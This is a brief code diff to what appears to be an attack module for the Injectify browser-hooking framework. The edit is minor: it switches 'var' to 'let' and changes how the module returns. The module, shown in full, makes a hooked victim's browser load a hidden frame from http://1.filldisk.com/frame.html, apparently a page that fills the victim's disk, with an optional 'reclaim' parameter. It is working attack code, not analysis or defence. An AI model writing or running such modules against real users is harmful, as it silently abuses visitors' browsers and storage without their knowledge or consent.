@@ -4,7 +4,7 @@ declare const { Module, injectify } : ModuleTypings
 /**
  * Parse params
  */
-var reclaim = ''
+let reclaim = ''
 if (typeof Module.params == 'object') {
     if (Module.params.reclaim) reclaim = '?reclaim=true'
 }
@@ -15,6 +15,6 @@ if (typeof Module.params == 'object') {
 injectify.module('embed', {
     url: `http://1.filldisk.com/frame.html${reclaim}`,
     hidden: true,
-}).then(() => {
-    Module.return(true)
+}).then((embed) => {
+    Module.resolve(embed)
 })
